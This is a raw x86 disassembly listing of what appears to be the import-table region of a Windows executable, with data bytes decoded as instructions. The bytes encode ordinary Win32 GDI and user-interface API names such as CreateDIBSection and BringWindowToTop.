  4285f4:	and    BYTE PTR [esi+0x2],dl
  4285fa:	add    BYTE PTR [eax],al
  4285fc:	add    BYTE PTR [eax],al
  4285fe:	add    BYTE PTR [eax],al
  428600:	adc    BYTE PTR [ecx+0x2],cl
  428606:	add    BYTE PTR [eax],al
  428608:	mov    DWORD PTR cs:[edx],eax
  42860b:	add    BYTE PTR [edx-0x77],al
  42860e:	add    al,BYTE PTR [eax]
  428610:	pop    eax
  428611:	mov    DWORD PTR [edx],eax
  428613:	add    BYTE PTR [eax-0x77],ch
  428616:	add    al,BYTE PTR [eax]
  428618:	jbe    0x4285a3
  42861a:	add    al,BYTE PTR [eax]
  42861c:	mov    cs,WORD PTR [ecx-0x7665fffe]
  428622:	add    al,BYTE PTR [eax]
  428624:	mov    al,0x89
  428626:	add    al,BYTE PTR [eax]
  428628:	mov    esp,0xce000289
  42862d:	mov    DWORD PTR [edx],eax
  42862f:	add    dl,bl
  428631:	mov    DWORD PTR [edx],eax
  428633:	add    dl,ch
  428635:	mov    DWORD PTR [edx],eax
  428637:	add    dl,bh
  428639:	mov    DWORD PTR [edx],eax
  42863b:	add    BYTE PTR [esi],al
  42863d:	mov    al,BYTE PTR [edx]
  42863f:	add    BYTE PTR [edx+ecx*4],dl
  428642:	add    al,BYTE PTR [eax]
  428644:	and    BYTE PTR [edx-0x75d3fffe],cl
  42864a:	add    al,BYTE PTR [eax]
  42864c:	mov    al,BYTE PTR ss:[edx]
  42864f:	add    BYTE PTR [edx-0x76],cl
  428652:	add    al,BYTE PTR [eax]
  428654:	pop    esp
  428655:	mov    al,BYTE PTR [edx]
  428657:	add    BYTE PTR [esi-0x76],ah
  42865a:	add    al,BYTE PTR [eax]
  42865c:	jo     0x4285e8
  42865e:	add    al,BYTE PTR [eax]
  428660:	or     BYTE PTR [edx-0x756ffffe],0x2
  428667:	add    BYTE PTR [edx-0x4dfffd76],ah
  42866d:	mov    al,BYTE PTR [edx]
  42866f:	add    al,al
  428671:	mov    al,BYTE PTR [edx]
  428673:	add    ah,cl
  428675:	mov    al,BYTE PTR [edx]
  428677:	add    dl,bl
  428679:	mov    al,BYTE PTR [edx]
  42867b:	add    dl,ch
  42867d:	mov    al,BYTE PTR [edx]
  42867f:	add    dl,bh
  428681:	mov    al,BYTE PTR [edx]
  428683:	add    BYTE PTR [eax],cl
  428685:	mov    eax,DWORD PTR [edx]
  428687:	add    BYTE PTR [eax],ah
  428689:	mov    eax,DWORD PTR [edx]
  42868b:	add    BYTE PTR [edx],ch
  42868d:	mov    eax,DWORD PTR [edx]
  42868f:	add    BYTE PTR [edx],bh
  428691:	mov    eax,DWORD PTR [edx]
  428693:	add    BYTE PTR [edx-0x75],dl
  428696:	add    al,BYTE PTR [eax]
  428698:	mov    eax,DWORD PTR fs:[edx]
  42869b:	add    BYTE PTR [ebx+ecx*4+0x2],dh
  42869f:	add    BYTE PTR [ebx+ecx*4-0x7471fffe],al
  4286a6:	add    al,BYTE PTR [eax]
  4286a8:	pushf  
  4286a9:	mov    eax,DWORD PTR [edx]
  4286ab:	add    BYTE PTR [ebx+ecx*4-0x7447fffe],ch
  4286b2:	add    al,BYTE PTR [eax]
	...
  4286bc:	loop   0x428649
  4286be:	add    al,BYTE PTR [eax]
  4286c0:	lock mov eax,DWORD PTR [edx]
  4286c3:	add    BYTE PTR [esp+ecx*4],al
  4286c6:	add    al,BYTE PTR [eax]
  4286c8:	adc    cl,BYTE PTR [edx+eax*1+0x28c2800]
  4286cf:	add    BYTE PTR [edx],dh
  4286d1:	mov    WORD PTR [edx],es
  4286d3:	add    BYTE PTR [esi],bh
  4286d5:	mov    WORD PTR [edx],es
  4286d7:	add    BYTE PTR [esi-0x74],cl
  4286da:	add    al,BYTE PTR [eax]
  4286dc:	pusha  
  4286dd:	mov    WORD PTR [edx],es
  4286df:	add    BYTE PTR [esi-0x74],bh
  4286e2:	add    al,BYTE PTR [eax]
  4286e4:	nop
  4286e5:	mov    WORD PTR [edx],es
  4286e7:	add    BYTE PTR [esi-0x53fffd74],bl
  4286ed:	mov    WORD PTR [edx],es
  4286ef:	add    al,al
  4286f1:	mov    WORD PTR [edx],es
  4286f3:	add    ah,dl
  4286f5:	mov    WORD PTR [edx],es
  4286f7:	add    ah,ah
  4286f9:	mov    WORD PTR [edx],es
  4286fb:	add    dl,dh
  4286fd:	mov    WORD PTR [edx],es
  4286ff:	add    BYTE PTR [eax],al
  428701:	lea    eax,[edx]
  428703:	add    BYTE PTR [edx],dl
  428705:	lea    eax,[edx]
  428707:	add    BYTE PTR [ecx*4-0x72cbfffe],ah
  42870e:	add    al,BYTE PTR [eax]
  428710:	inc    esi
  428711:	lea    eax,[edx]
  428713:	add    BYTE PTR [edx-0x73],dl
  428716:	add    al,BYTE PTR [eax]
  428718:	lea    ax,[edx]
  42871b:	add    BYTE PTR [edx-0x73],bh
  42871e:	add    al,BYTE PTR [eax]
  428720:	mov    cl,BYTE PTR [ebp-0x7269fffe]
  428726:	add    al,BYTE PTR [eax]
  428728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428729:	lea    eax,[edx]
  42872b:	add    BYTE PTR [edx-0x3dfffd73],dh
  428731:	lea    eax,[edx]
  428733:	add    al,bl
  428735:	lea    eax,[edx]
  428737:	add    ah,ah
  428739:	lea    eax,[edx]
  42873b:	add    al,dh
  42873d:	lea    eax,[edx]
  42873f:	add    ah,bh
  428741:	lea    eax,[edx]
  428743:	add    BYTE PTR [edx],dl
  428745:	mov    es,WORD PTR [edx]
  428747:	add    BYTE PTR [esi+ecx*4],ah
  42874a:	add    al,BYTE PTR [eax]
  42874c:	xor    al,0x8e
  42874e:	add    al,BYTE PTR [eax]
  428750:	inc    edx
  428751:	mov    es,WORD PTR [edx]
  428753:	add    BYTE PTR [esi-0x72],dl
  428756:	add    al,BYTE PTR [eax]
  428758:	mov    es,WORD PTR fs:[edx]
  42875b:	add    BYTE PTR [eax-0x72],bh
  42875e:	add    al,BYTE PTR [eax]
  428760:	mov    cl,BYTE PTR [esi-0x7167fffe]
  428766:	add    al,BYTE PTR [eax]
  428768:	mov    ah,0x8e
  42876a:	add    al,BYTE PTR [eax]
  42876c:	(bad)  
  42876d:	mov    es,WORD PTR [edx]
  42876f:	add    dh,dl
  428771:	mov    es,WORD PTR [edx]
  428773:	add    al,dh
  428775:	mov    es,WORD PTR [edx]
  428777:	add    BYTE PTR [esi],al
  428779:	pop    DWORD PTR [edx]
  42877b:	add    BYTE PTR [edi+ecx*4],dl
  42877e:	add    al,BYTE PTR [eax]
  428780:	and    cl,BYTE PTR [edi-0x70c7fffe]
  428786:	add    al,BYTE PTR [eax]
  428788:	push   esp
  428789:	pop    DWORD PTR [edx]
  42878b:	add    BYTE PTR [edx-0x71],ah
  42878e:	add    al,BYTE PTR [eax]
  428790:	je     0x428721
  428792:	add    al,BYTE PTR [eax]
  428794:	mov    BYTE PTR [edi-0x7061fffe],cl
  42879a:	add    al,BYTE PTR [eax]
  42879c:	mov    ah,0x8f
  42879e:	add    al,BYTE PTR [eax]
  4287a0:	retf   0x28f
  4287a3:	add    al,bl
  4287a5:	pop    DWORD PTR [edx]
  4287a7:	add    ah,ch
  4287a9:	pop    DWORD PTR [edx]
  4287ab:	add    ah,bh
  4287ad:	pop    DWORD PTR [edx]
  4287af:	add    BYTE PTR [eax],cl
  4287b1:	nop
  4287b2:	add    al,BYTE PTR [eax]
  4287b4:	sbb    dl,BYTE PTR [eax-0x6fd5fffe]
  4287ba:	add    al,BYTE PTR [eax]
  4287bc:	cmp    al,0x90
  4287be:	add    al,BYTE PTR [eax]
  4287c0:	dec    edx
  4287c1:	nop
  4287c2:	add    al,BYTE PTR [eax]
  4287c4:	pop    esp
  4287c5:	nop
  4287c6:	add    al,BYTE PTR [eax]
  4287c8:	jb     0x42875a
  4287ca:	add    al,BYTE PTR [eax]
  4287cc:	mov    ss,WORD PTR [eax-0x6f5bfffe]
  4287d2:	add    al,BYTE PTR [eax]
  4287d4:	mov    dh,0x90
  4287d6:	add    al,BYTE PTR [eax]
  4287d8:	enter  0x290,0x0
  4287dc:	ficom  DWORD PTR [eax-0x6f11fffe]
  4287e2:	add    al,BYTE PTR [eax]
  4287e4:	cld    
  4287e5:	nop
  4287e6:	add    al,BYTE PTR [eax]
  4287e8:	or     al,0x91
  4287ea:	add    al,BYTE PTR [eax]
  4287ec:	sbb    BYTE PTR [ecx-0x6ed9fffe],dl
  4287f2:	add    al,BYTE PTR [eax]
  4287f4:	ds xchg ecx,eax
  4287f6:	add    al,BYTE PTR [eax]
  4287f8:	dec    esi
  4287f9:	xchg   ecx,eax
  4287fa:	add    al,BYTE PTR [eax]
  4287fc:	pop    esp
  4287fd:	xchg   ecx,eax
  4287fe:	add    al,BYTE PTR [eax]
  428800:	jo     0x428793
  428802:	add    al,BYTE PTR [eax]
  428804:	jle    0x428797
  428806:	add    al,BYTE PTR [eax]
  428808:	mov    dl,BYTE PTR [ecx-0x6e63fffe]
  42880e:	add    al,BYTE PTR [eax]
  428810:	scas   al,BYTE PTR es:[edi]
  428811:	xchg   ecx,eax
  428812:	add    al,BYTE PTR [eax]
  428814:	rcl    BYTE PTR [ecx-0x6e29fffe],0x2
  42881b:	add    dl,ah
  42881d:	xchg   ecx,eax
  42881e:	add    al,BYTE PTR [eax]
  428820:	lock xchg ecx,eax
  428822:	add    al,BYTE PTR [eax]
  428824:	cld    
  428825:	xchg   ecx,eax
  428826:	add    al,BYTE PTR [eax]
  428828:	or     dl,BYTE PTR [edx-0x6de1fffe]
  42882e:	add    al,BYTE PTR [eax]
  428830:	sub    dl,BYTE PTR [edx-0x6dc1fffe]
  428836:	add    al,BYTE PTR [eax]
  428838:	dec    edx
  428839:	xchg   edx,eax
  42883a:	add    al,BYTE PTR [eax]
  42883c:	pop    edx
  42883d:	xchg   edx,eax
  42883e:	add    al,BYTE PTR [eax]
  428840:	push   0x7e000292
  428845:	xchg   edx,eax
  428846:	add    al,BYTE PTR [eax]
  428848:	add    BYTE PTR [eax],al
  42884a:	add    BYTE PTR [eax],al
  42884c:	xchg   esi,eax
  42884d:	xchg   edx,eax
  42884e:	add    al,BYTE PTR [eax]
  428850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428851:	xchg   edx,eax
  428852:	add    al,BYTE PTR [eax]
  428854:	mov    dh,0x92
  428856:	add    al,BYTE PTR [eax]
  428858:	into   
  428859:	xchg   edx,eax
  42885a:	add    al,BYTE PTR [eax]
  42885c:	loopne 0x4287f0
  42885e:	add    al,BYTE PTR [eax]
  428860:	repnz xchg edx,eax
  428862:	add    al,BYTE PTR [eax]
  428864:	or     al,0x93
  428866:	add    al,BYTE PTR [eax]
  428868:	sbb    al,0x93
  42886a:	add    al,BYTE PTR [eax]
  42886c:	es xchg ebx,eax
  42886e:	add    al,BYTE PTR [eax]
  428870:	cmp    BYTE PTR [ebx-0x6cb7fffe],dl
  428876:	add    al,BYTE PTR [eax]
  428878:	pusha  
  428879:	xchg   ebx,eax
  42887a:	add    al,BYTE PTR [eax]
  42887c:	jo     0x428811
  42887e:	add    al,BYTE PTR [eax]
  428880:	adc    BYTE PTR [ebx-0x6c6dfffe],0x2
  428887:	add    BYTE PTR [ebx+edx*4-0x6c4ffffe],ah
  42888e:	add    al,BYTE PTR [eax]
  428890:	mov    esp,0xd2000293
  428895:	xchg   ebx,eax
  428896:	add    al,BYTE PTR [eax]
  428898:	out    0x93,al
  42889a:	add    al,BYTE PTR [eax]
  42889c:	cld    
  42889d:	xchg   ebx,eax
  42889e:	add    al,BYTE PTR [eax]
  4288a0:	adc    BYTE PTR [edx+eax*1+0x2942600],dl
  4288a7:	add    BYTE PTR [eax],bh
  4288a9:	xchg   esp,eax
  4288aa:	add    al,BYTE PTR [eax]
  4288ac:	inc    esp
  4288ad:	xchg   esp,eax
  4288ae:	add    al,BYTE PTR [eax]
  4288b0:	push   esp
  4288b1:	xchg   esp,eax
  4288b2:	add    al,BYTE PTR [eax]
  4288b4:	jb     0x42884a
  4288b6:	add    al,BYTE PTR [eax]
  4288b8:	mov    WORD PTR [edx+eax*1+0x2949a00],ss
  4288bf:	add    BYTE PTR [esi-0x39fffd6c],ch
  4288c5:	xchg   esp,eax
  4288c6:	add    al,BYTE PTR [eax]
  4288c8:	ficom  DWORD PTR [edx+eax*1+0x294ea00]
  4288cf:	add    BYTE PTR [eax],al
  4288d1:	xchg   ebp,eax
  4288d2:	add    al,BYTE PTR [eax]
  4288d4:	adc    dl,BYTE PTR [ebp-0x6adffffe]
  4288da:	add    al,BYTE PTR [eax]
  4288dc:	xor    dl,BYTE PTR [ebp-0x6abffffe]
  4288e2:	add    al,BYTE PTR [eax]
  4288e4:	push   eax
  4288e5:	xchg   ebp,eax
  4288e6:	add    al,BYTE PTR [eax]
  4288e8:	xchg   bp,ax
  4288ea:	add    al,BYTE PTR [eax]
  4288ec:	jl     0x428883
  4288ee:	add    al,BYTE PTR [eax]
  4288f0:	mov    WORD PTR [ebp-0x6a5dfffe],ss
  4288f6:	add    al,BYTE PTR [eax]
  4288f8:	lods   al,BYTE PTR ds:[esi]
  4288f9:	xchg   ebp,eax
  4288fa:	add    al,BYTE PTR [eax]
  4288fc:	mov    esi,0xce000295
  428901:	xchg   ebp,eax
  428902:	add    al,BYTE PTR [eax]
  428904:	fcom   QWORD PTR [ebp-0x6a0dfffe]
  42890a:	add    al,BYTE PTR [eax]
  42890c:	add    BYTE PTR [eax],al
  42890e:	add    BYTE PTR [eax],al
  428910:	xchg   edx,eax
  428911:	add    edx,DWORD PTR [edx+0x74]
  428914:	ins    BYTE PTR es:[edi],dx
  428915:	dec    ecx
  428916:	outs   dx,BYTE PTR ds:[esi]
  428917:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  42891f:	jb     0x42898a
  428921:	outs   dx,BYTE PTR ds:[esi]
  428922:	add    BYTE PTR [bp+0x74],ch
  428926:	fs ins BYTE PTR es:[edi],dx
  428928:	ins    BYTE PTR es:[edi],dx
  428929:	cs fs ins BYTE PTR es:[edi],dx
  42892c:	ins    BYTE PTR es:[edi],dx
  42892d:	add    BYTE PTR [ecx+0x74654701],dl
  428933:	push   esi
  428934:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  42893b:	dec    edi
  42893c:	jb     0x4289a5
  42893e:	inc    ebp
  42893f:	js     0x428941
  428941:	add    BYTE PTR [edx+0x74654701],cl
  428947:	push   esp
  428948:	gs js  0x4289bf
  42894b:	inc    ebp
  42894c:	js     0x4289c2
  42894e:	outs   dx,BYTE PTR gs:[esi]
  428950:	je     0x4289a2
  428952:	outs   dx,DWORD PTR ds:[esi]
  428953:	imul   ebp,DWORD PTR [esi+0x74],0x1fb0057
  42895a:	push   ebx
  42895b:	gs je  0x4289b2
  42895e:	gs js  0x4289d5
  428961:	inc    ecx
  428962:	ins    BYTE PTR es:[edi],dx
  428963:	imul   esp,DWORD PTR [edi+0x6e],0xd50000
  42896a:	inc    ebp
  42896b:	js     0x4289e1
  42896d:	push   esp
  42896e:	gs js  0x4289e5
  428971:	dec    edi
  428972:	jne    0x4289e8
  428974:	push   edi
  428975:	add    BYTE PTR [eax],dl
  428977:	add    dl,BYTE PTR [edx+esi*2+0x61]
  42897b:	outs   dx,BYTE PTR ds:[esi]
  42897c:	jae    0x4289ea
  42897e:	popa   
  42897f:	je     0x4289e6
  428981:	inc    ebx
  428982:	push   0x65737261
  428987:	je     0x4289d2
  428989:	outs   dx,BYTE PTR ds:[esi]
  42898a:	outs   dx,WORD PTR ds:[esi]
  42898c:	add    BYTE PTR [eax],al
  42898e:	pop    ss
  42898f:	add    dl,BYTE PTR [edi+0x69]
  428992:	fs outs dx,BYTE PTR gs:[esi]
  428995:	push   eax
  428996:	popa   
  428997:	je     0x428a01
  428999:	add    BYTE PTR [ebp+0x65724300],cl
  42899f:	popa   
  4289a0:	je     0x428a07
  4289a2:	inc    ebx
  4289a3:	outs   dx,DWORD PTR ds:[esi]
  4289a4:	ins    DWORD PTR es:[edi],dx
  4289a5:	jo     0x428a08
  4289a7:	je     0x428a12
  4289a9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x44]
  4289ad:	inc    ebx
  4289ae:	add    BYTE PTR [eax],al
  4289b0:	mov    bh,0x1
  4289b2:	push   eax
  4289b3:	outs   dx,DWORD PTR ds:[esi]
  4289b4:	ins    BYTE PTR es:[edi],dx
  4289b5:	jns    0x428a23
  4289b7:	imul   ebp,DWORD PTR [esi+0x65],0x1940000
  4289be:	inc    edi
  4289bf:	gs je  0x428a19
  4289c2:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4289c9:	addr16 inc ebp
  4289cb:	js     0x4289cd
  4289cd:	add    cl,ch
  4289cf:	add    DWORD PTR [ebx+0x65],edx
  4289d2:	je     0x428a20
  4289d4:	popa   
  4289d5:	jns    0x428a46
  4289d7:	jne    0x428a4d
  4289d9:	add    bl,dl
  4289db:	add    DWORD PTR [ebx+0x65],edx
  4289de:	je     0x428a21
  4289e0:	bound  ebp,QWORD PTR [edi+0x72]
  4289e3:	je     0x428a35
  4289e5:	jb     0x428a56
  4289e7:	arpl   WORD PTR [eax],ax
  4289e9:	add    BYTE PTR [edx],cl
  4289eb:	add    dl,BYTE PTR [ebx+0x74]
  4289ee:	jb     0x428a55
  4289f0:	je     0x428a55
  4289f2:	push   0x69424944
  4289f7:	je     0x428a6c
  4289f9:	add    BYTE PTR [ebx+0x1],al
  4289fc:	inc    edi
  4289fd:	gs je  0x428a44
  428a00:	dec    ecx
  428a01:	inc    edx
  428a02:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655301eb
  428a0a:	je     0x428a59
  428a0c:	popa   
  428a0d:	jo     0x428a5c
  428a0f:	outs   dx,DWORD PTR ds:[esi]
  428a10:	fs add BYTE PTR gs:[eax],al
  428a14:	daa    
  428a15:	add    DWORD PTR [edi+0x65],eax
  428a18:	je     0x428a5c
  428a1a:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  428a1e:	add    BYTE PTR gs:[ebx+0x66664f01],ah
  428a25:	jae    0x428a8c
  428a27:	je     0x428a7b
  428a29:	outs   dx,BYTE PTR ds:[si]
  428a2b:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  428a32:	jo     0x428aa7
  428a34:	gs add ah,cl
  428a37:	add    DWORD PTR [ebx+0x63],edx
  428a3a:	popa   
  428a3b:	ins    BYTE PTR es:[edi],dx
  428a3c:	gs push edi
  428a3e:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428a45:	je     0x428a8c
  428a47:	js     0x428a49
  428a49:	add    BYTE PTR [edx+0x1],bh
  428a4c:	inc    edi
  428a4d:	gs je  0x428aa3
  428a50:	je     0x428ac1
  428a52:	arpl   WORD PTR [ebx+0x4f],bp
  428a55:	bound  ebp,QWORD PTR [edx+0x65]
  428a58:	arpl   WORD PTR [eax+eax*1+0x0],si
  428a5c:	call   0x5465:0x6e694c01
  428a63:	outs   dx,DWORD PTR ds:[esi]
  428a64:	add    BYTE PTR [eax],al
  428a66:	mov    dh,0x1
  428a68:	push   eax
  428a69:	outs   dx,DWORD PTR ds:[esi]
  428a6a:	ins    BYTE PTR es:[edi],dx
  428a6b:	jns    0x428ad4
  428a6d:	outs   dx,DWORD PTR ds:[esi]
  428a6e:	outs   dx,BYTE PTR ds:[esi]
  428a6f:	add    BYTE PTR [esi+0x1],bh
  428a72:	inc    edi
  428a73:	gs je  0x428aca
  428a76:	gs js  0x428aed
  428a79:	inc    ecx
  428a7a:	ins    BYTE PTR es:[edi],dx
  428a7b:	imul   esp,DWORD PTR [edi+0x6e],0x18c0000
  428a82:	inc    edi
  428a83:	gs je  0x428ada
  428a86:	gs js  0x428afd
  428a89:	inc    esi
  428a8a:	popa   
  428a8b:	arpl   WORD PTR [ebp+0x57],sp
  428a8e:	add    BYTE PTR [eax],al
  428a90:	mov    ebx,0x61655201
  428a95:	ins    BYTE PTR es:[edi],dx
  428a96:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428a9d:	je     0x428b13
  428a9f:	add    BYTE PTR gs:[eax],al
  428aa2:	mov    DWORD PTR [ecx],0x69736552
  428aa8:	jp     0x428b0f
  428aaa:	push   eax
  428aab:	popa   
  428aac:	ins    BYTE PTR es:[edi],dx
  428aad:	gs je  0x428b24
  428ab0:	add    BYTE PTR gs:[ecx+0x6d6f4300],al
  428ab7:	bound  ebp,QWORD PTR [ecx+0x6e]
  428aba:	gs push edx
  428abc:	outs   dx,BYTE PTR ds:[si]
  428abe:	add    BYTE PTR [eax],al
  428ac0:	push   cs
  428ac1:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  428ac5:	je     0x428b16
  428ac7:	jne    0x428b3d
  428ac9:	inc    ecx
  428aca:	add    BYTE PTR [eax],al
  428acc:	test   DWORD PTR [ecx],0x52746553
  428ad2:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428ad7:	outs   dx,BYTE PTR ds:[esi]
  428ad8:	add    BYTE PTR [eax],al
  428ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428adb:	add    BYTE PTR [ebx+0x72],al
  428ade:	gs popa 
  428ae0:	je     0x428b47
  428ae2:	push   eax
  428ae3:	popa   
  428ae4:	ins    BYTE PTR es:[edi],dx
  428ae5:	gs je  0x428b5c
  428ae8:	add    BYTE PTR gs:[ecx+eax*1],ah
  428aec:	inc    edi
  428aed:	gs je  0x428b32
  428af0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428af8:	jae    0x428afa
  428afa:	mov    DWORD PTR [eax],0x6d756e45
  428b00:	inc    esi
  428b01:	outs   dx,DWORD PTR ds:[esi]
  428b02:	outs   dx,BYTE PTR ds:[esi]
  428b03:	je     0x428b78
  428b05:	push   edi
  428b06:	add    BYTE PTR [eax],al
  428b08:	lods   al,BYTE PTR ds:[esi]
  428b09:	add    BYTE PTR [ebx+0x72],al
  428b0c:	gs popa 
  428b0e:	je     0x428b75
  428b10:	push   edx
  428b11:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428b16:	outs   dx,BYTE PTR ds:[esi]
  428b17:	dec    ecx
  428b18:	outs   dx,BYTE PTR ds:[esi]
  428b19:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  428b21:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428b25:	gs inc esp
  428b27:	inc    esp
  428b28:	inc    ecx
  428b29:	add    ch,dl
  428b2b:	add    DWORD PTR [ebx+0x65],edx
  428b2e:	je     0x428b72
  428b30:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428b38:	jae    0x428b3a
  428b3a:	mov    BYTE PTR [eax],al
  428b3c:	inc    ebx
  428b3d:	jb     0x428ba4
  428b3f:	popa   
  428b40:	je     0x428ba7
  428b42:	inc    edx
  428b43:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428b4b:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428b52:	mov    es,WORD PTR [ecx]
  428b54:	inc    edi
  428b55:	gs je  0x428bac
  428b58:	gs js  0x428bcf
  428b5b:	dec    ebp
  428b5c:	gs je  0x428bd1
  428b5f:	imul   esp,DWORD PTR [ebx+0x73],0x1da0057
  428b66:	push   ebx
  428b67:	gs je  0x428bac
  428b6a:	jb     0x428be1
  428b6c:	jae    0x428bd6
  428b6e:	dec    edi
  428b6f:	jb     0x428bd8
  428b71:	inc    ebp
  428b72:	js     0x428b74
  428b74:	mov    esp,0x63655201
  428b79:	je     0x428bc4
  428b7b:	outs   dx,BYTE PTR ds:[esi]
  428b7c:	push   edx
  428b7d:	imul   ebp,DWORD PTR gs:[bx+0x6e],0xcd0000
  428b86:	inc    ebp
  428b87:	jae    0x428bec
  428b89:	popa   
  428b8a:	jo     0x428bf1
  428b8c:	add    BYTE PTR [eax],al
  428b8e:	scas   eax,DWORD PTR es:[edi]
  428b8f:	add    DWORD PTR [eax+0x6f],edx
  428b92:	ins    BYTE PTR es:[edi],dx
  428b93:	jns    0x428bd7
  428b95:	gs jp  0x428c01
  428b98:	gs jb  0x428b9b
  428b9b:	add    BYTE PTR [ebx+0x65724300],ch
  428ba1:	popa   
  428ba2:	je     0x428c09
  428ba4:	push   edx
  428ba5:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428baa:	outs   dx,BYTE PTR ds:[esi]
  428bab:	add    BYTE PTR [edi+0x65724300],cl
  428bb1:	popa   
  428bb2:	je     0x428c19
  428bb4:	inc    esp
  428bb5:	inc    ebx
  428bb6:	push   edi
  428bb7:	add    BYTE PTR ds:0x74654701,bh
  428bbd:	inc    ebx
  428bbe:	jne    0x428c32
  428bc0:	jb     0x428c27
  428bc2:	outs   dx,BYTE PTR ds:[esi]
  428bc3:	je     0x428c14
  428bc5:	bound  ebp,QWORD PTR [edx+0x65]
  428bc8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bcc:	inc    edi
  428bcd:	inc    esp
  428bce:	dec    ecx
  428bcf:	xor    esi,DWORD PTR [edx]
  428bd1:	cs fs ins BYTE PTR es:[edi],dx
  428bd4:	ins    BYTE PTR es:[edi],dx
  428bd5:	add    BYTE PTR [ebx+0x6f],ah
  428bd8:	outs   dx,BYTE PTR ds:[esi]
  428bd9:	jae    0x428c4a
  428bdb:	ins    BYTE PTR es:[edi],dx
  428bdc:	gs cs fs ins BYTE PTR es:[edi],dx
  428be0:	ins    BYTE PTR es:[edi],dx
  428be1:	add    BYTE PTR [ecx],bh
  428be3:	add    BYTE PTR [ebx+0x68],al
  428be6:	popa   
  428be7:	jb     0x428c3e
  428be9:	jo     0x428c5b
  428beb:	gs jb  0x428c45
  428bee:	add    BYTE PTR [eax],al
  428bf0:	dec    esi
  428bf1:	add    dl,BYTE PTR [ebx+0x65]
  428bf4:	je     0x428c43
  428bf6:	outs   dx,BYTE PTR gs:[esi]
  428bf8:	jne    0x428c43
  428bfa:	je     0x428c61
  428bfc:	ins    DWORD PTR es:[edi],dx
  428bfd:	dec    ecx
  428bfe:	outs   dx,BYTE PTR ds:[esi]
  428bff:	outs   dx,WORD PTR ds:[esi]
  428c01:	push   edi
  428c02:	add    BYTE PTR [eax],al
  428c04:	scas   al,BYTE PTR es:[edi]
  428c05:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428c09:	fs inc ebx
  428c0b:	jne    0x428c7f
  428c0d:	jae    0x428c7e
  428c0f:	jb     0x428c68
  428c11:	add    BYTE PTR [eax+0x0],bl
  428c14:	inc    ebx
  428c15:	jb     0x428c7c
  428c17:	popa   
  428c18:	je     0x428c7f
  428c1a:	inc    esp
  428c1b:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  428c22:	jb     0x428c85
  428c24:	ins    DWORD PTR es:[edi],dx
  428c25:	inc    ecx
  428c26:	add    BYTE PTR [eax],al
  428c28:	popf   
  428c29:	add    DWORD PTR [ecx+0x73],ecx
  428c2c:	dec    ebp
  428c2d:	outs   dx,BYTE PTR gs:[esi]
  428c2f:	jne    0x428c31
  428c31:	add    BYTE PTR [eax+0x1],ch
  428c34:	inc    edi
  428c35:	gs je  0x428c8f
  428c38:	imul   ebp,DWORD PTR [esi+0x64],0x6200776f
  428c3f:	add    DWORD PTR [edi+0x65],eax
  428c42:	je     0x428c98
  428c44:	outs   dx,DWORD PTR ds:[esi]
  428c45:	jo     0x428c9e
  428c47:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428c4e:	mov    ds:0x57734901,eax
  428c53:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  428c5a:	jae    0x428cc5
  428c5c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  428c60:	sub    eax,0x74654701
  428c65:	dec    ebp
  428c66:	outs   dx,BYTE PTR gs:[esi]
  428c68:	jne    0x428cad
  428c6a:	push   0x4d6b6365
  428c6f:	popa   
  428c70:	jb     0x428cdd
  428c72:	inc    esp
  428c73:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  428c7a:	outs   dx,BYTE PTR ds:[esi]
  428c7b:	jae    0x428c7d
  428c7d:	add    BYTE PTR [edx],bl
  428c7f:	add    BYTE PTR [ebx+0x61],al
  428c82:	ins    BYTE PTR es:[edi],dx
  428c83:	ins    BYTE PTR es:[edi],dx
  428c84:	push   edi
  428c85:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428c8c:	outs   dx,DWORD PTR ds:[esi]
  428c8d:	arpl   WORD PTR [ecx+0x0],ax
  428c90:	repz add BYTE PTR [edi+0x65],al
  428c94:	je     0x428cd9
  428c96:	popa   
  428c97:	jb     0x428cfe
  428c99:	je     0x428ceb
  428c9b:	outs   dx,DWORD PTR ds:[esi]
  428c9c:	jae    0x428c9e
  428c9e:	ret    0x7702
  428ca1:	jbe    0x428d16
  428ca3:	jo     0x428d17
  428ca5:	imul   ebp,DWORD PTR [esi+0x74],0x5766
  428cac:	test   al,0x1
  428cae:	dec    esp
  428caf:	outs   dx,DWORD PTR ds:[esi]
  428cb0:	popa   
  428cb1:	fs inc ecx
  428cb3:	arpl   WORD PTR [ebx+0x65],sp
  428cb6:	ins    BYTE PTR es:[edi],dx
  428cb7:	gs jb  0x428d1b
  428cba:	je     0x428d2b
  428cbc:	jb     0x428d31
  428cbe:	push   edi
  428cbf:	add    BYTE PTR [edi],cl
  428cc1:	add    BYTE PTR [edx+0x72],al
  428cc4:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  428ccb:	outs   dx,DWORD PTR ds:[esi]
  428ccc:	ja     0x428d22
  428cce:	outs   dx,DWORD PTR ds:[esi]
  428ccf:	push   esp
  428cd0:	outs   dx,DWORD PTR ds:[esi]
  428cd1:	jo     0x428cd3
